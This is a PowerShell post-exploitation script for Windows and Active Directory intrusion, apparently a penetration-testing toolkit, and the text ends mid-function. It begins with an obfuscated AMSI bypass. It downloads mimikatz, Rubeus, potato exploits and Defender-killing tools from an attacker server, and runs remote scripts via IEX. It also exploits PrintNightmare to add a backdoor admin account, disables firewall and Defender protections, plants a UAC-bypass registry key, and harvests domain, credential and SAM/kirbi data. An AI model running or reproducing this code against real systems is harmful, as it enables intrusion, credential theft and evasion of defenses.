$t = [Ref].Assembly.GetType(([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=='))))
$f = $t.GetField(([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static')
$f.SetValue($null,$true)
$websrv = "<IPADDRESS>"
$webport = "<PORT>"
$p = "C:\windows\tasks"
#$websrv = Read-Host "Please enter your webserver IP"
#$webport = Read-Host "Please enter your webserver Port"
#$p = Read-Host "Please enter a path we can write to"
$uri = "http://" + $websrv + ":" + $webport

function listfunctions{
    Write-Host "disable_protections"
    Write-Host "enum_allthethings"
    Write-Host "enum_local"
    Write-Host "enum_computers"
    Write-Host "enum_sqlservers"
    Write-Host "enum_webservers"
    Write-Host "enum_domadmins"
    Write-Host "enum_users"
    Write-Host "enum_groups"
    Write-Host "enum_groups_resolvenested"
    Write-Host "enum_groups_toplevel"
    Write-Host "enum_specificuser"
    Write-Host "enum_specificgroup"
    Write-Host "enum_getspns"
    Write-Host "enum_adpeas"
    Write-Host "enum_adenum"
    Write-Host "enum_ADRecon"
    Write-Host "enum_powerview"
    Write-Host "enum_inveigh"    
    Write-Host "find_PSRemotingLocalAdmin"
    Write-Host "find_WMILocalAdmin"
    Write-Host "shell_powercat"
    Write-Host "pullfiles"
    Write-Host "printnightmare"
    Write-Host "hostrecon"
    Write-Host "privesc"
    Write-Host "cats"
    Write-Host "kerberoast"
    Write-Host "asreproast"
    Write-Host "bloodhound"
    Write-Host "bloodhound-ce"
    Write-Host "group3r"
    Write-Host "sharppack"
    Write-Host "password_spray"
    Write-Host "enum_uac_fodhelper"
    Write-Host "enum_uac_fodrunner - **host shellrunner run.txt**"

}

function pullfiles{
    Write-Host "## Pulling all the files"
    #iwr -o $p/outfile.ext $uri/file.ext
    iwr -o $p/xc.exe $uri/xc.exe
    iwr -o $p/accesschk.exe $uri/accesschk.exe
    iwr -o $p/accesschk64.exe $uri/accesschk64.exe
    iwr -o $p/PowerUp.ps1 $uri/PowerUp.ps1
    iwr -o $p/HiveNightmare.exe $uri/HiveNightmare.exe
    iwr -o $p/CVE-2021-1675.ps1 $uri/CVE-2021-1675.ps1
    iwr -o $p/SharpHound.ps1 $uri/SharpHound.ps1
    iwr -o $p/SharpHound.exe $uri/SharpHound.exe
    #iwr -o $p/sharphound_old.exe $uri/sharphound_old.exe
    iwr -o $p/HostRecon.ps1 $uri/HostRecon.ps1
    iwr -o $p/ADRecon.ps1 $uri/ADRecon.ps1
    iwr -o $p/domscripts.bat $uri/domscripts/domscripts.bat
    iwr -o $p/seatbelt.exe $uri/Seatbelt.exe
    iwr -o $p/sharpup.exe $uri/SharpUp.exe
    iwr -o $p/jaws-enum.ps1 $uri/jaws-enum.ps1
    iwr -o $p/procexp64.exe $uri/procexp64.exe
    iwr -o $p/windows-privesc-check2.exe $uri/windows-privesc-check2.exe
    iwr -o $p/Procmon.exe $uri/Procmon.exe
    iwr -o $p/Procmon64.exe $uri/Procmon64.exe
    iwr -o $p/RoguePotato.exe $uri/RoguePotato.exe
    iwr -o $p/JuicyPotato.exe $uri/JuicyPotato.exe
    iwr -o $p/Juicy.Potato.x86.exe $uri/Juicy.Potato.x86.exe
    iwr -o $p/Invoke-Tater.ps1 $uri/Invoke-Tater.ps1
    iwr -o $p/Autoruns64.exe $uri/Autoruns64.exe
    iwr -o $p/nc.exe $uri/nc.exe
    iwr -o $p/plink.exe $uri/plink.exe
    iwr -o $p/wget.exe $uri/wget.exe
    iwr -o $p/whoami.exe $uri/whoami.exe
    iwr -o $p/Watson.exe $uri/Watson.exe
    iwr -o $p/powerview.ps1 $uri/powerview.ps1
    iwr -o $p/sherlock.ps1 $uri/Sherlock.ps1
    iwr -o $p/powercat.ps1 $uri/powercat.ps1
    iwr -o $p/Invoke-HiveNightmare.ps1 $uri/Invoke-HiveNightmare.ps1
    iwr -o $p/Rubeus.exe $uri/Rubeus.exe
    iwr -o $p/PrintSpoofer.exe $uri/PrintSpoofer.exe
    iwr -o $p/mimikatz.exe $uri/mimikatz32.exe
    iwr -o $p/mimikatz32.exe $uri/mimikatz32.exe
    iwr -o $p/mimikatz64.exe $uri/mimikatz64.exe
    iwr -o $p/winpeasx86.exe $uri/winpeasx86.exe
    iwr -o $p/winpeasx64.exe $uri/winpeasx64.exe
    iwr -o $p/adpeas.ps1 $uri/adPEAS.ps1
    iwr -o $p/Invoke-ADEnum.ps1 $uri/Invoke-ADEnum.ps1
    iwr -o $p/psexec.exe $uri/PsExec.exe
    iwr -o $p/psexec64.exe $uri/PsExec64.exe
    iwr -o $p/PrivescCheck.ps1 $uri/PrivescCheck.ps1
    iwr -o $p/chisel.exe $uri/chisel-x64.exe
    iwr -o $p/Certify.exe $uri/Certify.exe
    iwr -o $p/Invoke-Mimikatz.ps1 $uri/Invoke-Mimikatz.ps1
    iwr -o $p/RunWithRegistryNonAdmin.bat $uri/RunWithRegistryNonAdmin.bat
    iwr -o $p/RunWithPathAsAdmin.bat $uri/RunWithPathAsAdmin.bat
    iwr -o $p/InShellProf.dll $uri/InShellProf.dll
    iwr -o $p/SafetyKatz.exe $uri/SafetyKatz.exe
    iwr -o $p/BetterSafetyKatz.exe $uri/BetterSafetyKatz.exe
    iwr -o $p/Invoke-Encode.ps1 $uri/Invoke-Encode.ps1
    iwr -o $p/Loader.exe $uri/Loader.exe
    iwr -o $p/Microsoft.ActiveDirectory.Management.dll $uri/Microsoft.ActiveDirectory.Management.dll
    iwr -o $p/GetUserSPNs.ps1 $uri/GetUserSPNs.ps1
    iwr -o $p/RACE.ps1 $uri/RACE.ps1
    iwr -o $p/Find-PSRemotingLocalAdminAccess.ps1 $uri/Find-PSRemotingLocalAdminAccess.ps1
    iwr -o $p/Find-WMILocalAdminAccess.ps1 $uri/Find-WMILocalAdminAccess.ps1
    iwr -o $p/AzureHound.ps1 $uri/AzureHound.ps1
    iwr -o $p/Set-RemotePSRemoting.ps1 $uri/Set-RemotePSRemoting.ps1
    iwr -o $p/Invoke-Kerberoast.ps1 $uri/Invoke-Kerberoast.ps1
    iwr -o $p/ASREPRoast.ps1 $uri/ASREPRoast.ps1
    iwr -o $p/Set-RemotePSRemoting.ps1 $uri/Set-RemotePSRemoting.ps1
    iwr -o $p/Invoke-AESEncryption.ps1 $uri/Invoke-AESEncryption.ps1
    iwr -o $p/PSUpload.ps1 $uri/PSUpload.ps1
    iwr -o $p/PPLKiller.exe $uri/PPLKiller.exe
    iwr -o $p/Invoke-ACLPwn.ps1 $uri/Invoke-ACLPwn.ps1
    iwr -o $p/Minidump.exe $uri/Minidump.exe
    iwr -o $p/DefendersDeath.ps1 $uri/DefendersDeath.ps1
    iwr -o $p/uacbypass.ps1 $uri/uacbypass.ps1
    iwr -o $p/FuckDefender.ps1 $uri/FuckDefender.ps1
    iwr -o $p/lazagne.exe $uri/lazagne.exe
    iwr -o $p/Rubeus.dll $uri/Rubeus.dll
    iwr -o $p/PrintSpoofer_old.exe $uri/PrintSpoofer_old.exe
    iwr -o $p/chisel.exe $uri/chisel.exe
    iwr -o $p/Invoke-SMBEnum.ps1 $uri/Invoke-SMBEnum.ps1
    iwr -o $p/Invoke-SMBClient.ps1 $uri/Invoke-SMBClient.ps1
    iwr -o $p/Invoke-WMIExec.ps1 $uri/Invoke-WMIExec.ps1
    iwr -o $p/Invoke-SMBExec.ps1 $uri/Invoke-SMBExec.ps1
    iwr -o $p/Invoke-TheHash.ps1 $uri/Invoke-TheHash.ps1
    iwr -o $p/Invoke-SocksProxy.ps1 $uri/Invoke-SocksProxy.ps1
    iwr -o $p/PingCastle.exe $uri/PingCastle.exe
    iwr -o $p/Group3r.exe $uri/Group3r.exe
    iwr -o $p/PowerUpSQL.ps1 $uri/PowerUpSQL.ps1
    iwr -o $p/PetitPotam.exe $uri/PetitPotam.exe
    iwr -o $p/pe_loader.ps1 $uri/pe_loader.ps1
    iwr -o $p/snaffler.exe $uri/snaffler.exe
    iwr -o $p/Inveigh.ps1 $uri/Inveigh.ps1
    iwr -o $p/DomainPasswordSpray.ps1 $uri/DomainPasswordSpray.ps1
    iwr -o $p/LAPSToolkit.ps1 $uri/LAPSToolkit.ps1

}

#function enum_local($outfile){
function enum_local{
    Write-Host "## Performing Local System Checks"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumlocaloutput = "enum-local-" + $timestamp + ".txt"
    # timestamp
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S" | Out-File $p\$enumlocaloutput

    # get the date
    Get-Date | Out-File -Append $p\$enumlocaloutput

    # get execution policy
    Get-ExecutionPolicy | Out-File -Append $p\$enumlocaloutput

    # get the hostname
    $env:COMPUTERNAME | Out-File -Append $p\$enumlocaloutput

    # get users
    whoami /all | Out-File -Append $p\$enumlocaloutput
    Get-LocalUser | Select-Object name, enabled, sid | Out-File -Append $p\$enumlocaloutput

    # get the groups and their members and display only user objects
    Get-LocalGroup | 
    foreach {
        Try {
            Write-Output `n $_.name 
            (Get-LocalGroupMember $_.name -ErrorAction SilentlyContinue | Where-Object {$_.objectclass -imatch "user"} | 
            Select-Object Name, PrincipalSource ) 
            Write-Output "**********************************"
        }
        Catch {
            Write-Error "Failed to get members of group: $_.name"
            Continue
        }
    } | Out-File -Append $p\$enumlocaloutput


    # get the currently logged in users by querying who owns current running processes
    $(Get-WmiObject win32_process).getowner() | Select-Object user | Sort-Object user -Unique | Out-File -Append $p\$enumlocaloutput

    # get the currently running processes and their session id
    Get-Process | Select-Object name, si, id | sort -Property id | Out-File -Append $p\$enumlocaloutput
    tasklist /SVC | Out-File -Append $p\$enumlocaloutput

    #get the services and their states
    Get-Service | Select-Object status, name | Out-File -Append $p\$enumlocaloutput

    # get network information
    Get-NetIPConfiguration | Out-File -Append $p\$enumlocaloutput

    # get listening network sockets
    Get-NetTCPConnection -State Listen `
    | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess `
    | sort -Property OwningProcess `
    | Format-Table | Out-File -Append $p\$enumlocaloutput

    # get Established network sockets
    Get-NetTCPConnection -State Established `
    | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess `
    | sort -Property OwningProcess `
    | Format-Table | Out-File -Append $p\$enumlocaloutput

    # get system configuration information
    Get-ComputerInfo | select OSName | Out-File -Append $p\$enumlocaloutput
    Get-ComputerInfo | Out-File -Append $p\$enumlocaloutput

    # get the mapped drives
    Get-PSDrive | Select-Object name | Out-File -Append $p\$enumlocaloutput

    # get plug and play devices
    Get-PnpDevice | Select-Object status, class, name | Out-File -Append $p\$enumlocaloutput

    # get shared resorces
    Get-SmbShare | Out-File -Append $p\$enumlocaloutput

    # get scheduled tasks
    Get-ScheduledJob | Out-File -Append $p\$enumlocaloutput
}

function enum_computers{
    Write-Host "## Enumerating Computers"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumcomputersoutput = "enum-computers-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="(objectcategory=Computer)"
    $Result = $Searcher.FindAll()
    echo "Computers:" | Out-File $p\$enumcomputersoutput
    echo $timestamp | Out-File -Append $p\$enumcomputersoutput 
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
        #$prop.name
        $prop.name | Out-File -Append $p\$enumcomputersoutput
        }   
    }
    Write-Output "----------------------------" | Out-File -Append $p\$enumcomputersoutput
}

function enum_domadmins{
    Write-Host "## Enumerating Domain Admins"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumdomadminsoutput = "enum-domadmins-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="(name=Domain Admins)"
    $Result = $Searcher.FindAll()
    echo "Domain Administrators:" | Out-File $p\$enumdomadminsoutput
    echo $timestamp | Out-File -Append $p\$enumdomadminsoutput
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
        #$prop.member
        $prop.member | Out-File -Append $p\$enumdomadminsoutput
        }
        Write-Output "----------------------------" | Out-File -Append $p\$enumdomadminsoutput
    }
}

function enum_specificgroup{
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $func_groupname = Read-Host -Prompt "Enter the group"
    $enumspecificgroupoutput = "enum-specificgroup-" + $timestamp + "-" + $func_groupname + ".txt"
    $enumspecificgroupoutputlist = "enum-specificgroup-" + $timestamp + "-" + $func_groupname + "-list.txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.SearchScope = "Subtree"
    $Searcher.Filter = "(&(objectclass=group)(name=*$func_groupname*))"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add('name')
    $Searcher.PropertiesToLoad.Add('description')
    $Searcher.PropertiesToLoad.Add('distinguishedname')
    $func_groupcn = $Searcher.FindOne().Properties.distinguishedname
    $Searcher.PropertiesToLoad.Clear()
    $Filter = "memberOf:1.2.840.113556.1.4.1941:=" + $func_groupcn
    $Searcher.filter= $Filter
    $Result = $Searcher.FindAll()
    echo $func_groupname | Out-File $p\$enumspecificgroupoutput
    echo $timestamp | Out-File -Append $p\$enumspecificgroupoutput 
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
            $specificgroupoutputformat = "Username: " + $prop.samaccountname + "     Name: " + $prop.name + "     Description: " + $prop.description
            $specificgroupoutputformat
            $prop.samaccountname | Out-File -Append $p\$enumspecificgroupoutputlist          
            $specificgroupoutputformat | Out-File -Append $p\$enumspecificgroupoutput          
        }
    }
    Write-Output "----------------------------" | Out-File -Append $p\$enumspecificgroupoutput
}

function enum_groups{
    Write-Host "## Enumerating Groups"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumgroupsoutput = "enum-groups-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="(objectClass=Group)"
    $Result = $Searcher.FindAll()
    echo $timestamp | Out-File $p\$enumgroupsoutput 
    Foreach($obj in $Result)
    {
        #$obj.Properties.name
        $obj.Properties.name | Out-File -Append $p\$enumgroupsoutput
    }
}

function enum_getspns{
    Write-Host "## Getting SPNs"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumgetspnsoutput = "enum-spns-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="serviceprincipalname=*"
    $Result = $Searcher.FindAll()
    echo $timestamp | Out-File $p\$enumgetspnsoutput 
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
            #$prop.serviceprincipalname
            $prop.serviceprincipalname | Out-File -Append $p\$enumgetspnsoutput
            Write-Output "--------------------------" | Out-File -Append $p\$enumgetspnsoutput
        }
    }
}

function enum_groups_toplevel{
    Write-Host "## Resolving Top Level Groups"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumallgroupsoutput = "enum-groups-toplevel-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.SearchScope = "Subtree"
    $Searcher.Filter = "(objectclass=group)"
    $Searcher.PageSize = 1000
    $Searcher.PropertiesToLoad.Add('name')
    $Searcher.PropertiesToLoad.Add('*')
    $Result = $Searcher.FindAll()
    echo "All Groups: " | Out-File $p\$enumallgroupsoutput
    echo $timestamp | Out-File -Append $p\$enumallgroupsoutput 
    Foreach($obj in $Result)
    {
        echo $obj.Properties.name | Out-File -Append $p\$enumallgroupsoutput
        echo $obj.Properties.distinguishedname | Out-File -Append $p\$enumallgroupsoutput
        echo $obj.Properties.member | Out-File -Append $p\$enumallgroupsoutput
        Write-Output "----------------------------" | Out-File -Append $p\$enumallgroupsoutput
    }
    Write-Output "----------------------------" | Out-File -Append $p\$enumallgroupsoutput
}


function enum_groups_resolvenested {
    Write-Host "## Resolving Nested Groups"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enum_groups_resolvenestedoutput = "enum-groups-resolve-nested-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.SearchScope = "Subtree"
    $Searcher.Filter = "(objectclass=group)"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add('name')
    $Searcher.PropertiesToLoad.Add('description')
    $Searcher.PropertiesToLoad.Add('distinguishedname')
    $Groups = $Searcher.FindAll()

    Foreach($Group in $Groups)
    {
        $func_groupcn = $Group.Properties.distinguishedname
        $Searcher.PropertiesToLoad.Clear()
        $Filter = "memberOf:1.2.840.113556.1.4.1941:=" + $func_groupcn
        $Searcher.filter= $Filter
        $Result = $Searcher.FindAll()
        echo $Group.Properties.name | Out-File -Append -FilePath $p\$enum_groups_resolvenestedoutput
        Foreach($obj in $Result)
        {
            Foreach($prop in $obj.Properties)
            {
                $specificgroupoutputformat = "Username: " + $prop.samaccountname + "     Name: " + $prop.name + "     Description: " + $prop.description
                #$specificgroupoutputformat
                $specificgroupoutputformat | Out-File -Append -FilePath $p\$enum_groups_resolvenestedoutput
            }
        }
        Write-Output "----------------------------" | Out-File -Append -FilePath $p\$enum_groups_resolvenestedoutput
    }
}




function enum_users{
    Write-Host "## Enumerating Users"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumusersoutput = "enum-users-" + $timestamp + ".txt"
    $usernamesoutput = "enum-usernames-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="samAccountType=805306368"
    Write-output "users: " | Out-File $p\$enumusersoutput
    $Result = $Searcher.FindAll()
    $usernames = @()
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
            #$prop
            $prop | Out-File -Append $p\$enumusersoutput
        }
        Write-Output "------------------------" | Out-File -Append $p\$enumusersoutput
        $usernames += $obj.Properties["samAccountName"]
    }
    $usernames | Out-File -FilePath $p\$usernamesoutput
}


function enum_specificuser{
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumspecificuseroutput = "enum-specificuser-" + $timestamp + ".txt"
    $domainObjuser = Read-Host "What user (ex. Jeff_Admin)"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="samaccountname=$domainObjuser"
    $Searcher.FindAll() | Foreach-Object {
        Foreach($prop in $_.Properties)
        {
            $prop
            $prop | Out-File -Append $p\$enumspecificuseroutput
        }
        Write-Host "------------------------"
        $user = $_.GetDirectoryEntry()
        $memberof = $user.memberof
        Foreach($group in $memberof)
        {
            $group
            $group | Out-File -Append $p\$enumspecificuseroutput
        }
        Write-Host "------------------------"
        Write-Host "Group Names:"
        Foreach($group in $memberof)
        {
            $groupName = ($group -split ",")[0]
            $groupName = $groupName -replace "CN=",""
            $groupName
            $groupName | Out-File -Append $p\$enumspecificuseroutput
        }
    }
}

function zip_files {
    param (
        [string]$path
    )

    # Check if the path exists
    if (Test-Path $path -PathType Container) {
        # Get all files in the directory
        $allFiles = Get-ChildItem -Path $path -Recurse

        # Filter files with specific extensions or directories containing "ADRecon-Report"
        $files = $allFiles | Where-Object { 
            $_.Extension -match '\.txt$|\.html$|\.csv$|\.xml$|\.zip$|\.kirbi$|\.sam$|\.system$|\.security$' -or 
            ($_.PSIsContainer -and $_.Name -like '*enum-ADRecon*')
        }

        # Debug information
        Write-Host "Files and directories found:"
        $files | ForEach-Object { Write-Host $_.FullName }

        if ($files.Count -gt 0) {
            # Create a zip file with a custom name
            $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m"
            $zipFileName = Join-Path -Path $path -ChildPath "00-enum-zip-$timestamp.zip"
            $base64FileName = Join-Path -Path $path -ChildPath "enum-zip-$timestamp.b64"

            # Create a temporary directory to store the zip file
            $tempDir = New-Item -ItemType Directory -Path (Join-Path $env:TEMP "EnumZipTemp")

            # Copy the files and directories to the temporary directory
            $files | ForEach-Object {
                $destPath = Join-Path -Path $tempDir.FullName -ChildPath $_.FullName.Substring($path.Length).TrimStart('\')
                if ($_.PSIsContainer) {
                    Copy-Item -Path $_.FullName -Destination $destPath -Recurse
                } else {
                    New-Item -ItemType Directory -Path (Split-Path $destPath) -Force | Out-Null
                    Copy-Item -Path $_.FullName -Destination $destPath
                }
            }

            # Zip the temporary directory
            $tempZipFile = Join-Path -Path $tempDir.FullName -ChildPath "temp.zip"
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir.FullName, $tempZipFile)

            # Encode the zip file as Base64 and write to a file
            $base64Data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($tempZipFile))
            $base64Data | Out-File -FilePath $base64FileName -Encoding ASCII

            # Write-Host "Base64 file created: $base64FileName"

            # Decode the Base64 file back to the original zip file
            Decode-Base64Zip -base64File $base64FileName -outputPath $zipFileName

            # Remove the temporary directory
            Remove-Item -Path $tempDir.FullName -Recurse -Force
        } else {
            Write-Host "No txt, html files, or ADRecon-Report directories found in the specified directory."
        }
    } else {
        Write-Host "Path does not exist: $path"
    }
}


function Decode-Base64Zip {
    param (
        [string]$base64File,
        [string]$outputPath
    )

    if (Test-Path $base64File -PathType Leaf) {
        # Read the Base64 data from the file
        $base64Data = Get-Content -Path $base64File -Raw

        # Decode the Base64 data
        $zipData = [Convert]::FromBase64String($base64Data)

        # Write the zip data to the original zip file
        [System.IO.File]::WriteAllBytes($outputPath, $zipData)

        Write-Host "Zip file written to: $outputPath"

        # Delete the Base64 file
        Remove-Item -Path $base64File -Force
    } else {
        Write-Host "Base64 file does not exist: $base64File"
    }
}

function enum_adpeas{
    Write-Host "## Running ADPeas"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumadpeasoutput = "enum-adpeas-" + $timestamp + ".txt"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/adPEAS.ps1')
    echo "adpeas:" | Out-File $p\$enumadpeasoutput
    echo $timestamp | Out-File -Append $p\$enumadpeasoutput
    invoke-adpeas | Out-File -Append $p\$enumadpeasoutput -Force
}

function run_adalanche {
    param(
        [string]$domain = $env:USERDNSDOMAIN
    )

    Write-Host "## Running Adalanche against domain: $domain"

    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $outputfile = "adalanche-" + $timestamp + ".txt"

    # Download Adalanche.exe
    Invoke-WebRequest -Uri "$uri/adalanche.exe" -OutFile "$p\adalanche.exe"

    # Run Adalanche and capture output
    echo "adalanche:" | Out-File "$p\$outputfile"
    echo $timestamp | Out-File -Append "$p\$outputfile"
    Start-Process -FilePath "$p\adalanche.exe" -ArgumentList "collect activedirectory --domain $domain" -NoNewWindow -RedirectStandardOutput "$p\adalanche-run-$timestamp.txt" -Wait
    Get-Content "$p\adalanche-run-$timestamp.txt" | Out-File -Append "$p\$outputfile"
}

function enum_adenum{
    Write-Host "## Running ADenum"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/Invoke-ADEnum.ps1')
    Invoke-ADEnum -SecurityGroups -GPOsRights -LAPSReadRights -RBCD -AllGroups -SprayEmptyPasswords -UserCreatedObjects -Output $p\
}

function enum_ADRecon {
    Write-Host "## Running ADRecon"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumADReconoutput = "enum-ADRecon-" + $timestamp + ".txt"
    $adreconPath = Join-Path -Path $p -ChildPath "ADRecon.ps1"
    $outputDir = Join-Path -Path $p -ChildPath "enum-ADRecon"
    $adreconzipFilePath = Join-Path -Path $p -ChildPath ("enum-ad-recon-" + $timestamp + ".zip")

    Push-Location -Path $p

    # Download the ADRecon.ps1 script
    Invoke-WebRequest -Uri ($uri + '/ADRecon.ps1') -OutFile $adreconPath

    # Execute the downloaded ADRecon.ps1 script
    & $adreconPath -OutputType All -OutputDir $outputDir

    # Remove the downloaded ADRecon.ps1 script
    Remove-Item -Path $adreconPath -Force

    # Compress the output directory
    Compress-Archive -Path $outputDir -DestinationPath $adreconzipFilePath

    # Optionally, remove the unzipped output directory after compressing
    Remove-Item -Path $outputDir -Recurse -Force

    Pop-Location
}



function printnightmare{
    Write-Host "## Printing the nightmare"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/CVE-2021-1675.ps1')
    Invoke-Nightmare -NewUser "manhattn" -NewPassword "Password1!"
    Write-Host "Username manhattn, password Password1!"
    Write-Host "Schedule a task: "
    Write-Host "Current time: " + $timestamp
    Write-Host "Schtasks /create /RU manhattn /RP 'Password1!' /sc minute /mo 5 /TR 'c:\windows\tasks\run.exe' /ST 10:18:33 /TN gettheshell"
}


function disable_protections {
    netsh advfirewall set allprofiles state off
    set-MpPreference -DisableRealtimeMonitoring $true
    Set-MPPreference -DisableIOAVProtection $true
    Set-MPPreference -DisableIntrusionPreventionSystem $true
    Add-MpPreference -ExclusionPath C:\
    Add-MpPreference -ExclusionPath C:\windows\temp
    Add-MpPreference -ExclusionPath C:\windows\tasks
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
    New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
    net user /add manhattn 'Password1!'
